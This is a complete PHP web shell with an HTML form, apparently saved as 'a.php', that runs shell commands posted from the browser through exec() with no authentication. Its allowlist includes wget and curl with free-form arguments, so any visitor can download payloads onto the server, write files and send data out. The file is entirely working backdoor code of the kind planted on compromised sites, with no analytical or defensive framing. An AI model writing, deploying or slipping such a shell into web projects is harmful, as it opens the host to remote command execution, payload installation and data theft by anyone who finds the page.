<?php
// Aktifkan error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Definisikan pesan hasil
$resultMessage = "";

// Cek jika permintaan AJAX POST
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Ambil input dari pengguna
    $userInput = isset($_POST['command']) ? trim($_POST['command']) : '';

    // Daftar perintah yang diizinkan
    $allowedCommands = ['ls', 'mkdir', 'mv', 'wget', 'curl', 'cd'];

    // Pisahkan input perintah dan argumen
    $parts = explode(' ', $userInput, 2);
    $command = $parts[0];
    $args = isset($parts[1]) ? $parts[1] : '';

    // Periksa apakah perintah ada dalam daftar yang diizinkan
    if (in_array($command, $allowedCommands)) {
        // Periksa apakah perintah `cd` digunakan dan tangani dengan cara yang berbeda
        if ($command == 'cd') {
            $resultMessage = "Cannot change directory with 'cd' command in this environment.";
        } else {
            // Gabungkan perintah dan argumen, dan sanitasi input
            $fullCommand = escapeshellcmd($command . ' ' . $args);
            
            // Jalankan perintah shell
            $commandOutput = [];
            $commandReturnValue = 0;
            exec($fullCommand . ' 2>&1', $commandOutput, $commandReturnValue);
            
            // Gabungkan hasil
            $resultMessage = implode("\n", $commandOutput);
            
            // Jika perintah tidak berhasil, beri tahu pengguna
            if ($commandReturnValue !== 0) {
                $resultMessage = "Error executing command.";
            }
        }
    } else {
        $resultMessage = "Invalid command.";
    }

    // Kirim hasil sebagai JSON
    header('Content-Type: application/json');
    echo json_encode(['result' => $resultMessage]);
    exit; // Menghentikan eksekusi skrip setelah mengirim respons JSON
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Shell Command Executor</title>
    <script>
        function executeCommand() {
            // Ambil perintah dari input
            var command = document.getElementById('commandInput').value;

            // Buat objek XMLHttpRequest
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'a.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            
            // Ketika permintaan selesai
            xhr.onload = function () {
                if (xhr.status === 200) {
                    var response = JSON.parse(xhr.responseText);
                    document.getElementById('result').innerText = response.result;
                } else {
                    document.getElementById('result').innerText = 'Error: ' + xhr.status;
                }
            };

            // Kirim perintah ke server
            xhr.send('command=' + encodeURIComponent(command));
        }
    </script>
</head>
<body>
    <h1>Execute Shell Command</h1>
    <form onsubmit="event.preventDefault(); executeCommand();">
        <label for="commandInput">Enter shell command (e.g., ls, mkdir, mv, wget, curl):</label>
        <input type="text" id="commandInput" name="command" required>
        <button type="submit">Execute</button>
    </form>
    <pre id="result"></pre>
</body>
</html>
